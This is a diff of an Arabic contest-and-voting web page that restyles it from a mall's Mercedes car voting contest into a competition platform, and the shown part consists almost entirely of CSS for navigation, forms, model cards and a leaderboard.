@@ -3,977 +3,1313 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>البيرق مول • عدن | مسابقة التصويت الكبرى على سيارة مرسيدس</title>
+<title>أمير المترات | المنصة الشاملة لمسابقة وتصويت متر فلينج</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg-carbon: #050608;
-    --bg-obsidian: #0c0e14;
-    --bg-panel: #131722;
-    --border-gold: rgba(242, 193, 78, 0.36);
-    --border-line: rgba(255, 255, 255, 0.08);
-    --gold: #f2c14e;
-    --gold-bright: #fff1b8;
-    --crimson: #e11d48;
-    --crimson-soft: rgba(225, 29, 72, 0.16);
-    --jade: #10b981;
-    --text-light: #f9fafb;
-    --text-dim: #9ca3af;
-    --grad-gold: linear-gradient(135deg, #b88314 0%, #f7d67c 50%, #9b6910 100%);
-    --grad-crimson: linear-gradient(135deg, #be123c 0%, #f43f5e 100%);
-    --grad-card: linear-gradient(165deg, rgba(22, 27, 40, 0.96) 0%, rgba(10, 12, 18, 0.98) 100%);
+    --bg-canvas: #060d14;
+    --bg-card: #0c1924;
+    --bg-card-elev: #122434;
+    --border-line: #1e3a4c;
+    --emerald: #10b981;
+    --emerald-deep: #047857;
+    --emerald-glow: rgba(16, 185, 129, 0.28);
+    --amber: #f59e0b;
+    --amber-bright: #fbbf24;
+    --amber-glow: rgba(245, 158, 11, 0.3);
+    --danger: #f43f5e;
+    --text-main: #f1f5f9;
+    --text-sub: #94a3b8;
+    --grad-primary: linear-gradient(135deg, #059669 0%, #0f766e 55%, #d97706 100%);
+    --grad-amber: linear-gradient(135deg, #fbbf24 0%, #d97706 100%);
+    --grad-surface: linear-gradient(160deg, #102130 0%, #09131c 100%);
   }
 
-  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-  html { scroll-behavior: smooth; }
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Cairo', sans-serif;
+  }
+
+  html {
+    scroll-behavior: smooth;
+  }
 
   body {
-    background-color: var(--bg-carbon);
+    background-color: var(--bg-canvas);
     background-image:
-      radial-gradient(ellipse 85% 48% at 50% -6%, rgba(242, 193, 78, 0.18), transparent),
-      radial-gradient(circle at 10% 45%, rgba(225, 29, 72, 0.09), transparent 45%),
-      radial-gradient(circle at 90% 78%, rgba(242, 193, 78, 0.09), transparent 45%);
-    color: var(--text-light);
-    line-height: 1.8;
+      radial-gradient(circle at 12% 8%, rgba(16, 185, 129, 0.12) 0%, transparent 42%),
+      radial-gradient(circle at 88% 15%, rgba(245, 158, 11, 0.12) 0%, transparent 45%),
+      radial-gradient(circle at 50% 95%, rgba(15, 118, 110, 0.1) 0%, transparent 50%);
+    color: var(--text-main);
+    line-height: 1.75;
     overflow-x: hidden;
   }
 
-  /* ===== بوابة الترحيب ===== */
-  #introGate {
-    position: fixed; inset: 0;
-    background: rgba(5, 6, 8, 0.92);
-    backdrop-filter: blur(18px);
-    z-index: 9999;
-    display: flex; align-items: center; justify-content: center;
-    padding: 20px;
-    animation: fadeUpGate 0.3s ease forwards;
+  /* ===== شريط التنقل الموحد في الصفحة الواحدة ===== */
+  .topbar {
+    position: sticky;
+    top: 0;
+    z-index: 900;
+    background: rgba(6, 13, 20, 0.9);
+    backdrop-filter: blur(16px);
+    border-bottom: 1px solid var(--border-line);
   }
 
-  @keyframes fadeUpGate {
-    from { opacity: 0; transform: scale(0.94); }
-    to { opacity: 1; transform: scale(1); }
+  .topbar-inner {
+    max-width: 1220px;
+    margin: 0 auto;
+    padding: 12px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 14px;
+    flex-wrap: wrap;
   }
 
-  .gate-card {
-    background: var(--grad-card);
-    border: 2px solid var(--gold);
-    border-radius: 36px;
-    padding: 38px 28px;
-    max-width: 510px; width: 100%;
-    text-align: center;
-    box-shadow: 0 35px 90px rgba(0,0,0,0.92), 0 0 60px rgba(242,193,78,0.22);
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-weight: 900;
+    font-size: 21px;
+    color: var(--amber-bright);
   }
 
-  .gate-tag {
-    display: inline-block;
-    background: var(--grad-gold);
-    color: #050608;
-    font-weight: 900; font-size: 13px;
-    padding: 5px 18px; border-radius: 999px;
+  .brand-pill {
+    background: rgba(16, 185, 129, 0.15);
+    border: 1px solid var(--emerald);
+    color: #6ee7b7;
+    font-size: 11.5px;
+    font-weight: 800;
+    padding: 2px 10px;
+    border-radius: 999px;
+  }
+
+  .nav-menu {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+
+  .nav-menu a {
+    text-decoration: none;
+    color: var(--text-sub);
+    font-size: 13.5px;
+    font-weight: 800;
+    padding: 7px 14px;
+    border-radius: 10px;
+    transition: 0.2s;
+  }
+
+  .nav-menu a:hover {
+    color: #fff;
+    background: rgba(255, 255, 255, 0.06);
+  }
+
+  .nav-menu a.pill-amber {
+    background: var(--grad-amber);
+    color: #060d14;
+  }
+
+  .nav-menu a.pill-emerald {
+    background: var(--grad-primary);
+    color: #fff;
+  }
+
+  /* ===== ترويسة الصفحة الواحدة ===== */
+  .hero-wrap {
+    max-width: 1220px;
+    margin: 24px auto 0;
+    padding: 0 20px;
+  }
+
+  .hero-panel {
+    background: var(--grad-surface);
+    border: 1.5px solid rgba(245, 158, 11, 0.35);
+    border-radius: 28px;
+    padding: 36px 30px;
+    display: grid;
+    grid-template-columns: 1.25fr 0.75fr;
+    gap: 28px;
+    align-items: center;
+    box-shadow: 0 24px 60px rgba(0, 0, 0, 0.55);
+  }
+
+  .hero-kicker {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(245, 158, 11, 0.14);
+    border: 1px solid rgba(251, 191, 36, 0.4);
+    color: var(--amber-bright);
+    padding: 5px 15px;
+    border-radius: 999px;
+    font-size: 13px;
+    font-weight: 800;
     margin-bottom: 14px;
   }
 
-  .gate-card h2 {
-    font-size: 28px; font-weight: 900;
-    background: var(--grad-gold);
-    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-    margin-bottom: 12px; line-height: 1.3;
+  .hero-panel h1 {
+    font-size: 38px;
+    font-weight: 900;
+    line-height: 1.25;
+    margin-bottom: 12px;
   }
 
-  .gate-card p { color: #d1d5db; font-size: 15px; margin-bottom: 24px; }
-  .gate-btns { display: flex; flex-direction: column; gap: 11px; }
-
-  .g-btn {
-    border: none; border-radius: 999px;
-    padding: 14px 24px; font-size: 16px; font-weight: 900;
-    cursor: pointer; transition: 0.2s;
-  }
-  .g-btn.gold { background: var(--grad-gold); color: #050608; }
-  .g-btn.crimson {
-    background: var(--crimson-soft);
-    border: 1.5px solid var(--crimson);
-    color: #fda4af;
-  }
-  .g-btn:hover { transform: translateY(-2px); }
-
-  /* ===== شريط التنقل الزجاجي ===== */
-  .nav-shell {
-    position: sticky; top: 14px; z-index: 1000;
-    max-width: 1180px; margin: 0 auto; padding: 0 16px;
+  .hero-panel h1 span {
+    background: var(--grad-amber);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
   }
 
-  .nav-bar {
-    background: rgba(12, 14, 20, 0.86);
-    backdrop-filter: blur(24px);
-    border: 1px solid var(--border-gold);
-    border-radius: 999px;
-    padding: 10px 24px;
-    display: flex; align-items: center; justify-content: space-between;
-    flex-wrap: wrap; gap: 12px;
-    box-shadow: 0 20px 50px rgba(0,0,0,0.75);
+  .hero-panel p {
+    color: var(--text-sub);
+    font-size: 15.5px;
+    margin-bottom: 22px;
+    max-width: 640px;
   }
 
-  .mall-brand {
-    display: flex; align-items: center; gap: 12px;
+  .hero-btns {
+    display: flex;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+
+  .btn-main-amber {
     text-decoration: none;
+    background: var(--grad-amber);
+    color: #060d14;
+    font-weight: 900;
+    font-size: 15px;
+    padding: 12px 24px;
+    border-radius: 12px;
+    border: none;
+    cursor: pointer;
+    transition: 0.2s;
   }
 
-  .mall-emblem { width: 46px; height: 46px; flex-shrink: 0; }
-  .mall-brand-text { display: flex; flex-direction: column; line-height: 1.15; }
-  .mall-brand-text strong { font-size: 19px; font-weight: 900; color: var(--gold-bright); }
-  .mall-brand-text span { font-size: 11px; font-weight: 700; color: #fda4af; }
-
-  .nav-actions { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
-  .nav-actions a {
-    text-decoration: none; color: var(--text-dim);
-    font-size: 13.5px; font-weight: 800;
-    padding: 8px 16px; border-radius: 999px; transition: 0.2s;
-  }
-  .nav-actions a:hover { color: #fff; background: rgba(255,255,255,0.06); }
-  .nav-actions a.btn-vote { background: var(--grad-gold); color: #050608; }
-  .nav-actions a.btn-join { background: var(--grad-crimson); color: #fff; }
-
-  /* ===== الواجهة الرئيسية وبطاقة سيارة مرسيدس ===== */
-  .hero-section { max-width: 1180px; margin: 34px auto 0; padding: 16px 20px 36px; }
-
-  .hero-card {
-    background: var(--grad-card);
-    border: 1.5px solid var(--border-gold);
-    border-radius: 40px;
-    padding: 40px 32px;
-    display: grid; grid-template-columns: 1.12fr 0.88fr;
-    gap: 32px; align-items: center;
-    box-shadow: 0 35px 85px rgba(0,0,0,0.82);
+  .btn-main-emerald {
+    text-decoration: none;
+    background: var(--grad-primary);
+    color: #fff;
+    font-weight: 900;
+    font-size: 15px;
+    padding: 12px 24px;
+    border-radius: 12px;
+    border: none;
+    cursor: pointer;
+    transition: 0.2s;
   }
 
-  .city-ribbon {
-    display: inline-flex; align-items: center; gap: 8px;
-    background: rgba(242, 193, 78, 0.14);
-    border: 1px solid var(--gold);
-    color: var(--gold-bright);
-    padding: 6px 18px; border-radius: 999px;
-    font-size: 13px; font-weight: 800; margin-bottom: 16px;
+  .btn-main-amber:hover, .btn-main-emerald:hover {
+    transform: translateY(-2px);
   }
 
-  .hero-card h1 {
-    font-size: 43px; font-weight: 900; line-height: 1.24; margin-bottom: 14px;
-  }
-  .hero-card h1 span {
-    background: var(--grad-gold);
-    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-  }
-
-  .hero-card p { color: var(--text-dim); font-size: 16.5px; margin-bottom: 24px; }
-
-  .mercedes-frame-card {
-    background: #080a0f;
-    border: 2px solid var(--gold);
-    border-radius: 30px;
-    padding: 14px;
-    box-shadow: 0 24px 60px rgba(242, 193, 78, 0.2);
+  .hero-metric-box {
+    background: rgba(6, 13, 20, 0.72);
+    border: 1px solid var(--border-line);
+    border-radius: 22px;
+    padding: 20px;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
   }
 
-  .car-stage {
-    position: relative;
+  .metric-cell {
+    background: var(--bg-card-elev);
+    border: 1px solid rgba(16, 185, 129, 0.22);
+    border-radius: 16px;
+    padding: 16px 12px;
+    text-align: center;
+  }
+
+  .metric-cell strong {
+    display: block;
+    font-size: 22px;
+    font-weight: 900;
+    color: var(--amber-bright);
+  }
+
+  .metric-cell span {
+    font-size: 12px;
+    color: var(--text-sub);
+    font-weight: 700;
+  }
+
+  /* ===== الأقسام المجمعة في الصفحة الواحدة ===== */
+  .page-section {
+    max-width: 1220px;
+    margin: 48px auto;
+    padding: 0 20px;
+  }
+
+  .sec-title {
+    display: flex;
+    align-items: baseline;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 10px;
+    margin-bottom: 22px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--border-line);
+  }
+
+  .sec-title h2 {
+    font-size: 26px;
+    font-weight: 900;
+    color: #fff;
+  }
+
+  .sec-title span {
+    font-size: 13px;
+    font-weight: 800;
+    color: var(--emerald);
+  }
+
+  /* ===== معرض الصور والفئات ===== */
+  .models-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(255px, 1fr));
+    gap: 18px;
+  }
+
+  .model-card {
+    background: var(--grad-surface);
+    border: 1px solid var(--border-line);
     border-radius: 22px;
     overflow: hidden;
-    background: #12151f;
-    aspect-ratio: 16 / 10;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    transition: 0.22s;
   }
 
-  .car-stage img {
-    width: 100%; height: 100%; object-fit: cover; display: block;
-    transition: opacity 0.25s ease;
+  .model-card:hover {
+    transform: translateY(-4px);
+    border-color: var(--amber);
   }
 
-  .view-tabs {
-    display: flex; gap: 8px; margin-top: 10px; justify-content: center; flex-wrap: wrap;
-  }
-  .view-tab {
-    background: #141824;
-    border: 1px solid var(--border-line);
-    color: var(--text-dim);
-    padding: 5px 12px; border-radius: 999px;
-    font-size: 11.5px; font-weight: 800; cursor: pointer; transition: 0.2s;
-  }
-  .view-tab.active, .view-tab:hover {
-    border-color: var(--gold);
-    color: var(--gold-bright);
-    background: rgba(242, 193, 78, 0.14);
+  .model-banner {
+    height: 128px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    background: linear-gradient(135deg, #064e3b 0%, #0f172a 60%, #78350f 100%);
+    border-bottom: 1px solid var(--border-line);
   }
 
-  .car-footer-bar {
-    margin-top: 12px;
-    display: flex; align-items: center; justify-content: space-between;
-    gap: 10px; flex-wrap: wrap;
-  }
-  .car-footer-bar strong { color: var(--gold-bright); font-size: 15.5px; font-weight: 900; }
-  .car-footer-bar span {
-    background: var(--crimson-soft);
-    border: 1px solid var(--crimson);
-    color: #fda4af;
-    padding: 4px 12px; border-radius: 999px;
-    font-size: 12px; font-weight: 800;
+  .model-emoji {
+    font-size: 52px;
+    filter: drop-shadow(0 8px 16px rgba(0, 0, 0, 0.5));
   }
 
-  /* ===== العناوين والأقسام ===== */
-  section { max-width: 1180px; margin: 64px auto; padding: 0 20px; }
-  .sec-title-wrap { text-align: center; margin-bottom: 34px; }
-  .sec-title-wrap .kicker {
-    display: inline-block; color: #fda4af;
-    font-size: 13px; font-weight: 800; letter-spacing: 1.4px; margin-bottom: 6px;
-  }
-  .sec-title-wrap h2 { font-size: 34px; font-weight: 900; color: #fff; }
-
-  /* ===== بوابة التصويت والنتائج ===== */
-  .arena-shell {
-    background: var(--grad-card);
-    border: 2px solid var(--gold);
-    border-radius: 38px;
-    padding: 38px 30px;
-    box-shadow: 0 32px 80px rgba(0,0,0,0.82);
+  .model-tag {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    background: rgba(6, 13, 20, 0.85);
+    border: 1px solid var(--amber);
+    color: var(--amber-bright);
+    font-size: 11px;
+    font-weight: 800;
+    padding: 3px 10px;
+    border-radius: 999px;
   }
 
-  .status-row {
-    display: flex; justify-content: center; gap: 12px;
-    flex-wrap: wrap; margin-bottom: 24px;
+  .model-body {
+    padding: 18px;
   }
 
-  .status-tag {
-    display: inline-flex; align-items: center; gap: 8px;
+  .model-body h3 {
+    font-size: 18px;
+    font-weight: 900;
+    color: var(--amber-bright);
+    margin-bottom: 6px;
+  }
+
+  .model-body p {
+    font-size: 13.5px;
+    color: var(--text-sub);
+    margin-bottom: 14px;
+  }
+
+  .model-btn {
+    width: 100%;
+    padding: 10px;
+    border-radius: 12px;
+    border: 1px solid var(--emerald);
     background: rgba(16, 185, 129, 0.14);
-    border: 1px solid var(--jade);
-    color: #6ee7b7; padding: 7px 18px; border-radius: 999px;
-    font-size: 13px; font-weight: 800; transition: transform 0.2s ease;
+    color: #6ee7b7;
+    font-weight: 800;
+    font-size: 13.5px;
+    cursor: pointer;
+    transition: 0.2s;
   }
 
-  .pulse-lamp {
-    width: 9px; height: 9px; border-radius: 50%;
-    background: var(--jade);
-    animation: lampPulse 1.5s infinite;
+  .model-btn:hover {
+    background: var(--emerald);
+    color: #060d14;
   }
 
-  @keyframes lampPulse {
-    0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.75); }
-    70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
+  /* ===== لوحة التصويت والترتيب المباشر ===== */
+  .panel-box {
+    background: var(--grad-surface);
+    border: 1.5px solid var(--border-line);
+    border-radius: 26px;
+    padding: 28px;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.45);
+  }
+
+  .status-strip {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 10px;
+    margin-bottom: 18px;
+  }
+
+  .status-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(16, 185, 129, 0.14);
+    border: 1px solid rgba(16, 185, 129, 0.45);
+    color: #6ee7b7;
+    padding: 6px 15px;
+    border-radius: 999px;
+    font-size: 13px;
+    font-weight: 800;
+  }
+
+  .dot-live {
+    width: 9px;
+    height: 9px;
+    border-radius: 50%;
+    background: var(--emerald);
+    animation: pulseLive 1.5s infinite;
+  }
+
+  @keyframes pulseLive {
+    0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
+    70% { box-shadow: 0 0 0 9px rgba(16, 185, 129, 0); }
     100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
   }
 
-  .arena-columns {
-    display: grid; grid-template-columns: 1fr 1.15fr;
-    gap: 28px; align-items: start;
+  .alert-box {
+    background: rgba(244, 63, 94, 0.12);
+    border: 1px solid rgba(244, 63, 94, 0.55);
+    border-radius: 14px;
+    padding: 12px 16px;
+    color: #fda4af;
+    font-size: 13px;
+    font-weight: 700;
+    margin-bottom: 20px;
   }
 
-  .box-panel {
-    background: rgba(7, 9, 14, 0.92);
-    border: 1.5px solid var(--border-gold);
-    border-radius: 28px;
-    padding: 26px;
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1.15fr;
+    gap: 24px;
+    align-items: start;
   }
 
-  .box-panel h3 { color: var(--gold-bright); font-size: 21px; font-weight: 900; margin-bottom: 6px; }
-  .box-panel p.hint { color: var(--text-dim); font-size: 13.5px; margin-bottom: 18px; }
+  .sub-panel {
+    background: rgba(6, 13, 20, 0.78);
+    border: 1px solid var(--border-line);
+    border-radius: 20px;
+    padding: 22px;
+  }
 
-  .referral-notice {
+  .sub-panel h3 {
+    font-size: 19px;
+    font-weight: 900;
+    color: var(--amber-bright);
+    margin-bottom: 6px;
+  }
+
+  .sub-panel p.hint {
+    font-size: 13px;
+    color: var(--text-sub);
+    margin-bottom: 14px;
+  }
+
+  .invite-banner {
     display: none;
-    background: rgba(242, 193, 78, 0.14);
-    border: 1.5px solid var(--gold);
-    border-radius: 16px; padding: 14px;
-    margin-bottom: 18px; text-align: center;
-  }
-  .referral-notice strong { color: var(--gold-bright); font-size: 16px; }
-
-  .field-box { margin-bottom: 14px; }
-  .field-box label { display: block; font-size: 13.5px; font-weight: 800; color: #e5e7eb; margin-bottom: 6px; }
-
-  .field-box input, .field-box select, .field-box textarea {
-    width: 100%; padding: 13px 16px;
-    border: 1.5px solid #242938; border-radius: 15px;
-    background: #0d1017; color: #fff; font-size: 14.5px; transition: 0.2s;
-  }
-  .field-box input:focus, .field-box select:focus, .field-box textarea:focus {
-    outline: none; border-color: var(--gold);
-    box-shadow: 0 0 0 4px rgba(242, 193, 78, 0.18);
-  }
-  .field-box textarea { min-height: 90px; resize: vertical; }
-
-  .pass-holder { position: relative; }
-  .pass-eye {
-    position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
-    background: none; border: none; color: var(--text-dim);
-    font-size: 12.5px; font-weight: 800; cursor: pointer;
+    background: rgba(16, 185, 129, 0.16);
+    border: 1px solid var(--emerald);
+    border-radius: 14px;
+    padding: 12px 14px;
+    text-align: center;
+    font-size: 13.5px;
+    margin-bottom: 14px;
   }
 
-  .fairness-alert {
-    background: var(--crimson-soft);
-    border: 1px solid var(--crimson);
-    border-radius: 16px; padding: 14px 16px; margin-bottom: 16px;
-    display: flex; gap: 10px; align-items: flex-start;
-  }
-  .fairness-alert p { color: #fda4af; font-size: 13px; font-weight: 700; line-height: 1.65; }
-
-  .drop-card {
-    background: #0d1017;
-    border: 2px dashed rgba(242, 193, 78, 0.55);
-    border-radius: 20px; padding: 18px; text-align: center;
-    cursor: pointer; transition: 0.2s; margin-bottom: 14px;
-  }
-  .drop-card:hover { border-color: var(--gold-bright); }
-  .drop-card input[type="file"] { display: none; }
-  .drop-ico { font-size: 30px; display: block; margin-bottom: 4px; }
-  .drop-title { font-weight: 900; font-size: 14.5px; color: var(--gold-bright); }
-  .drop-note { font-size: 12px; color: var(--text-dim); }
-
-  .img-thumb {
-    display: none; max-width: 130px; max-height: 130px;
-    border-radius: 12px; margin: 12px auto 0;
-    border: 2px solid var(--gold); object-fit: cover;
+  .invite-banner strong {
+    color: var(--amber-bright);
   }
 
-  .calc-box {
-    background: #131722;
-    border: 1px dashed var(--gold);
-    border-radius: 14px; padding: 12px 16px;
-    display: flex; align-items: center; justify-content: space-between;
-    gap: 12px; margin-bottom: 16px;
+  .field {
+    margin-bottom: 13px;
   }
-  .calc-box span { font-weight: 900; color: var(--gold-bright); direction: ltr; }
-  .calc-box input { max-width: 105px; text-align: center; font-weight: 900; padding: 10px !important; }
 
-  .submit-btn {
-    width: 100%; margin-top: 10px; padding: 16px;
-    border: none; border-radius: 18px;
-    font-size: 18px; font-weight: 900; cursor: pointer; transition: 0.2s;
+  .field label {
+    display: block;
+    font-size: 13px;
+    font-weight: 800;
+    color: #e2e8f0;
+    margin-bottom: 5px;
   }
-  .submit-btn.gold { background: var(--grad-gold); color: #050608; }
-  .submit-btn.crimson { background: var(--grad-crimson); color: #fff; }
-  .submit-btn:hover { transform: translateY(-2px); }
-  .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
-  .status-msg {
-    display: none; margin-top: 14px; padding: 14px;
-    border-radius: 14px; text-align: center; font-weight: 800; font-size: 14px;
+  .field input, .field select, .field textarea {
+    width: 100%;
+    padding: 12px 14px;
+    border-radius: 12px;
+    border: 1.5px solid var(--border-line);
+    background: #07111a;
+    color: #fff;
+    font-size: 14px;
+    transition: 0.2s;
   }
-  .status-msg.err { display: block; background: var(--crimson-soft); color: #fda4af; border: 1px solid var(--crimson); }
-  .status-msg.ok { display: block; background: rgba(16, 185, 129, 0.18); color: #6ee7b7; border: 1px solid var(--jade); }
+
+  .field input:focus, .field select:focus, .field textarea:focus {
+    outline: none;
+    border-color: var(--emerald);
+  }
+
+  .field textarea {
+    min-height: 80px;
+    resize: vertical;
+  }
+
+  .pass-wrap {
+    position: relative;
+  }
+
+  .pass-btn {
+    position: absolute;
+    left: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    color: var(--text-sub);
+    font-size: 12.5px;
+    font-weight: 800;
+    cursor: pointer;
+  }
+
+  .file-drop {
+    background: #07111a;
+    border: 1.5px dashed rgba(251, 191, 36, 0.55);
+    border-radius: 14px;
+    padding: 14px;
+    text-align: center;
+    cursor: pointer;
+    transition: 0.2s;
+  }
+
+  .file-drop:hover {
+    border-color: var(--amber-bright);
+  }
+
+  .file-drop input[type="file"] {
+    display: none;
+  }
+
+  .file-drop .f-title {
+    display: block;
+    font-size: 13.5px;
+    font-weight: 800;
+    color: var(--amber-bright);
+  }
+
+  .file-drop .f-sub {
+    display: block;
+    font-size: 11.5px;
+    color: var(--text-sub);
+  }
+
+  .img-prev {
+    display: none;
+    max-width: 115px;
+    max-height: 115px;
+    border-radius: 10px;
+    margin: 10px auto 0;
+    border: 1.5px solid var(--amber);
+    object-fit: cover;
+  }
+
+  .captcha-row {
+    background: var(--bg-card-elev);
+    border: 1px solid var(--border-line);
+    border-radius: 12px;
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    margin-bottom: 14px;
+  }
+
+  .captcha-row span {
+    font-weight: 900;
+    color: var(--amber-bright);
+    direction: ltr;
+  }
+
+  .captcha-row input {
+    max-width: 105px;
+    text-align: center;
+    font-weight: 900;
+    padding: 8px !important;
+  }
+
+  .btn-submit {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: 900;
+    cursor: pointer;
+    transition: 0.2s;
+  }
+
+  .btn-submit.amber {
+    background: var(--grad-amber);
+    color: #060d14;
+  }
+
+  .btn-submit.emerald {
+    background: var(--grad-primary);
+    color: #fff;
+  }
+
+  .btn-submit:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+  }
+
+  .feedback {
+    display: none;
+    margin-top: 12px;
+    padding: 12px;
+    border-radius: 12px;
+    text-align: center;
+    font-size: 13.5px;
+    font-weight: 800;
+  }
+
+  .feedback.err {
+    display: block;
+    background: rgba(244, 63, 94, 0.16);
+    border: 1px solid var(--danger);
+    color: #fda4af;
+  }
+
+  .feedback.ok {
+    display: block;
+    background: rgba(16, 185, 129, 0.16);
+    border: 1px solid var(--emerald);
+    color: #6ee7b7;
+  }
 
   .thanks-box {
     display: none;
-    margin-top: 16px;
-    background: linear-gradient(145deg, rgba(242, 193, 78, 0.15), rgba(14, 17, 24, 0.96));
-    border: 2px solid var(--gold);
-    border-radius: 22px; padding: 20px; text-align: center;
-    animation: fadeUpGate 0.3s ease forwards;
-  }
-  .thanks-box h4 { color: var(--gold-bright); font-size: 18.5px; font-weight: 900; margin-bottom: 6px; }
-  .thanks-box p { color: #e5e7eb; font-size: 14px; }
-  .thanks-box .badge-mall {
-    display: inline-block; margin-top: 10px;
-    background: var(--grad-gold); color: #050608;
-    font-weight: 900; font-size: 12.5px;
-    padding: 5px 16px; border-radius: 999px;
+    margin-top: 14px;
+    background: rgba(16, 185, 129, 0.12);
+    border: 1.5px solid var(--emerald);
+    border-radius: 16px;
+    padding: 16px;
+    text-align: center;
   }
 
-  /* ===== جدول الترتيب ===== */
-  .search-field {
-    width: 100%; padding: 11px 16px; margin-bottom: 14px;
-    border: 1px solid var(--border-gold); border-radius: 14px;
-    background: #0d1017; color: #fff; font-size: 13.5px;
+  .thanks-box h4 {
+    color: #6ee7b7;
+    font-size: 16px;
+    font-weight: 900;
+    margin-bottom: 4px;
+  }
+
+  .thanks-box p {
+    color: #e2e8f0;
+    font-size: 13px;
+  }
+
+  /* ===== قائمة المتصدرين ===== */
+  .search-box {
+    width: 100%;
+    padding: 10px 14px;
+    border-radius: 12px;
+    border: 1px solid var(--border-line);
+    background: #07111a;
+    color: #fff;
+    font-size: 13.5px;
+    margin-bottom: 12px;
   }
 
   .board-scroll {
-    display: flex; flex-direction: column; gap: 11px;
-    max-height: 550px; overflow-y: auto; padding-left: 4px;
+    max-height: 530px;
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    padding-left: 4px;
   }
 
   .board-row {
-    background: #131722;
+    background: var(--bg-card-elev);
     border: 1px solid var(--border-line);
-    border-radius: 18px; padding: 14px 18px;
-    display: flex; align-items: center; justify-content: space-between;
-    gap: 12px; transition: 0.2s;
+    border-radius: 14px;
+    padding: 12px 14px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
   }
 
   .board-row.top-rank {
-    border: 2px solid var(--gold);
-    background: linear-gradient(90deg, rgba(242, 193, 78, 0.16), rgba(19, 23, 34, 0.95));
+    border-color: var(--amber);
+    background: linear-gradient(90deg, rgba(245, 158, 11, 0.16), rgba(18, 36, 52, 0.95));
   }
 
-  .board-left { display: flex; align-items: center; gap: 12px; }
-  .rank-num {
-    width: 38px; height: 38px; border-radius: 50%;
-    background: #080a0f; border: 1px solid var(--gold);
-    color: var(--gold-bright); font-weight: 900;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 15px; flex-shrink: 0;
-  }
-  .board-row.top-rank .rank-num { background: var(--grad-gold); color: #050608; border: none; }
-
-  .cand-title { font-weight: 800; font-size: 15.5px; color: #fff; }
-  .cand-sub { font-size: 12px; color: var(--text-dim); }
-  .cand-code { color: var(--gold-bright); font-weight: 800; direction: ltr; display: inline-block; }
-
-  .votes-pill {
-    background: rgba(16, 185, 129, 0.15);
-    border: 1px solid var(--jade);
-    color: #6ee7b7; padding: 5px 14px; border-radius: 999px;
-    font-weight: 900; font-size: 13.5px; white-space: nowrap;
+  .row-left {
+    display: flex;
+    align-items: center;
+    gap: 10px;
   }
 
-  .vote-row-btn {
-    background: var(--grad-gold); color: #050608;
-    border: none; padding: 6px 14px; border-radius: 12px;
-    font-weight: 900; font-size: 12px; cursor: pointer; margin-top: 5px;
+  .rank-circle {
+    width: 34px;
+    height: 34px;
+    border-radius: 50%;
+    background: #07111a;
+    border: 1px solid var(--emerald);
+    color: #6ee7b7;
+    font-weight: 900;
+    font-size: 13.5px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
   }
 
-  .admin-only-area { display: none; }
-  body.admin-mode .admin-only-area { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
-
-  .admin-kick-btn {
-    background: var(--crimson-soft);
-    border: 1px solid var(--crimson);
-    color: #fda4af; padding: 4px 10px; border-radius: 8px;
-    font-size: 11px; font-weight: 800; cursor: pointer; margin-top: 5px;
+  .board-row.top-rank .rank-circle {
+    background: var(--grad-amber);
+    color: #060d14;
+    border: none;
   }
 
-  .car-editor-panel {
-    margin-top: 14px; padding: 14px;
-    border-radius: 16px; background: #0d1017;
-    border: 1px dashed var(--gold);
-    width: 100%;
-  }
-  .car-editor-panel label { display: block; font-size: 12.5px; font-weight: 800; color: var(--gold-bright); margin-bottom: 6px; }
-  .car-editor-controls { display: flex; gap: 8px; flex-wrap: wrap; }
-  .car-editor-controls input {
-    flex: 1; min-width: 180px; padding: 9px 12px;
-    border-radius: 10px; border: 1px solid #242938;
-    background: #080a0f; color: #fff; font-size: 13px;
+  .row-name {
+    font-weight: 800;
+    font-size: 14.5px;
+    color: #fff;
   }
 
